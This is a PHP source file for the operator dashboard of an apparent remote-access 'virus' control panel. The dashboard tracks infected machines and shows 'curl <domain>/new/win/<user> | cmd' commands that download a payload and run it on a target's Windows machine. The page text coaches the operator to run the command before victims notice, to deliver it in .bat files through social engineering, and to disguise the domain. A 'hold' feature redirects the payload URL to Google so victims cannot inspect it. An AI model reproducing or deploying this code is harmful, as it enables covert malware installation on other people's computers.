<?php /** @noinspection PhpUnusedParameterInspection */

require_once(__DIR__ . "/../autoload.php");

use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\HtmlTemplate;
use Kelvinho\Virus\Singleton\Timezone;
use Kelvinho\Virus\User\User;
use Kelvinho\Virus\Virus\Virus;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\formattedTime;
use function Kelvinho\Virus\formattedTimeSpan;
use function Kelvinho\Virus\map;


/**
 * @param array $datas Array of {"virus_id" -> "{virus_id}", "last_ping" -> "{last ping}", "style" -> "{tr styles}", "displays" -> {"Name" -> "{name}", "Virus id" -> "{virus_id}", "Last seen" -> "{last_seen}"}}
 * @noinspection PhpUnusedParameterInspection
 */
function displayTable(array $datas) {
    if (count($datas) === 0) { ?>
        <p>(No viruses)</p>
    <?php } else { ?>
        <div style="overflow: auto;">
            <table>
                <tr>
                    <?php map($datas[0]["displays"], function ($value, $label) {
                        echo "<th>$label</th>";
                    }); ?>
                </tr>
                <?php
                map($datas, function ($datas, $virus_id) { ?>
                    <tr style="cursor: pointer;<?php echo $datas["style"]; ?>">
                        <?php map($datas["displays"], function ($value, $label) {
                            echo "<td>$value</td>";
                        }); ?>
                    </tr>
                <?php }); ?>
            </table>
        </div>
    <?php }
}

if (!$authenticator->authenticated()) {
    header("Location: " . DOMAIN_LOGIN);
    Header::redirect();
}

$user_handle = $session->get("user_handle");
$user = $userFactory->get($user_handle);
$alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
?>
<html lang="en_US">
<head>
    <title>Dashboard</title>
    <?php echo HtmlTemplate::header(); ?>
    <style>
        .codes {
            color: midnightblue;
        }

        table {
            border: none;
            border-collapse: collapse;
            padding: 0;
            margin: 0;
        }
        .hold {
            color: blue;
            cursor: pointer;
        }
    </style>
</head>
<body>
<h2>Active viruses</h2>
<p>These are viruses that are still reporting back pretty quickly (less
    than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_ACTIVE), function ($data, $key, $timezone) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
}, $user->getTimezone())); ?>
<h2>Dormant viruses</h2>
<p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
    than 2 days</p>
<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
}, $user->getTimezone())); ?>
<h2>Lost viruses</h2>
<p>These are viruses that don't report back for more than 2 days</p>
<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_LOST), function ($data, $key, $timezone) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
}, $user->getTimezone())); ?>
<h2>Expecting viruses</h2>
<p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
    triggered by accessing the entry point.</p>
<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_EXPECTING), function ($data) use ($virusFactory) {
    $virus = $virusFactory->get($data["virus_id"]);
    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
    return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
        "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
        "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
})); ?>
<h2>Emergency hold</h2>
<p>Normally, you can install the virus using the command below. What it does is it copies installation instructions from
    the URL and executes that. However, if you are trying to convince others to willingly install the virus on their
    computer, they might go to the URL and inspect what's there after they have run it (or before they run it, in which
    case you're out of luck). They may figure out where the virus is located and may get curious and reverse engineer it
    and foil your plans. So, this is a way to hide that URL, and redirect it to google if you choose to hold it.</p>
<?php
if ($user->isHold()) { ?>
    <p><span style = "color: red;">You are currently holding, meaning you can't install new viruses</span>. Click <a class = "hold" onclick="removeHold()">here</a> to
        remove hold.</p>
<?php } else { ?>
    <p>You are currently not holding, meaning you can install new viruses but outsiders can reverse engineer the virus.
        Click <a class = "hold" onclick="applyHold()">here</a> to apply a hold.</p>
<?php } ?>
<h2>Installing a new virus</h2>
To install a new virus on a computer, execute this command in the command prompt running Windows on the target machine:
<pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/win/<?php echo $user_handle; ?> | cmd</pre>
And run this for mac (in development):
<pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
<p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
    expecting viruses.
    After a few seconds, the virus will pings back for the first
    time, and will jump to the active viruses category. If this doesn't happen, then something has gone wrong and I
    have no idea how to fix it. May be the target machine has an antivirus? :D</p>
<p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
    quickly, before they can notice anything. You can also put this command inside of a file with extensions .cmd,
    .bat or .btm, then give it to your target by social engineering. Please note that every part of that command
    must be identical. That means there must be "curl" at the front, there must be a "https://", and there must be a
    "| cmd" (The "|" character in qwerty keyboards is usually right above the enter button). Miss anything and it
    won't work.</p>
<p>Or... You can use different domains, pointing to this domain. Let's say you have just bought the domain
    "awesome.app.com" and you want to use that instead of "virus.kelvinho.org", which would sound suspicious, you
    can just redirect your website to <?php echo DOMAIN; ?> (still note that this is hard if you don't know what you
    are doing, so just ask someone technical if you don't know how to do this). Then, the command to install the
    virus would be:</p>
<pre class="codes"
     style="overflow: auto;">curl -L awesome.app.com/new/win/<?php echo $user_handle; ?> | cmd</pre>
<p>The "-L" option is to go through all the redirects your web server guides and to fetch the final destination. If
    you're lazy and just don't agree that I should have the word virus inside of the install command, you can use
    any of these commands instead:</p>
<div style="overflow: auto;">
    <?php foreach ($alternates as $alternate) { ?>
        <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/win/<?php echo $user_handle; ?> | cmd</pre>
    <?php } ?>
</div>
<p>I can definitely add more, but what's the point? Also, note that <?php echo DOMAIN; ?> is the main site, and is
    accessible when encrypted only. Any insecure requests will be redirected to the secure site. However, all of the
    alternative built-in domains are unencrypted. You can use the alternative domains encrypted, but they don't have
    a valid certificate because I'm lazy to get one, and the main site already has a valid certificate, so why
    bother? So if you were to do the curl thing, option "-k" will accept encrypted requests with an invalid
    certificate.</p>
<p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
    to attack. The chance for attacking is very small, and you wouldn't want to have a chance and it doesn't get
    installed properly do you?</p>
<h2>Deleting a virus</h2>
<p>When you are done with a virus, you can just press delete, and then you will not be able to access it. The app
    will also send a kill signal to the virus itself, to make sure every trace of the virus is gone. There will be
    no oops button, so only delete a virus if you really want to.</p>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
<script type="application/javascript">
    function deleteVirus(virus_id) {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteVirus",
            type: "POST",
            data: {
                virus_id: virus_id
            },
            success: function () {
                window.location = "<?php echo DOMAIN; ?>";
            }
        });
    }

    function removeHold() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/removeHold",
            type: "POST",
            success: function () {
                window.location = "<?php echo DOMAIN_DASHBOARD; ?>";
            }
        });
    }

    function applyHold() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/applyHold",
            type: "POST",
            success: function () {
                window.location = "<?php echo DOMAIN_DASHBOARD; ?>";
            }
        });
    }
</script>
</html>
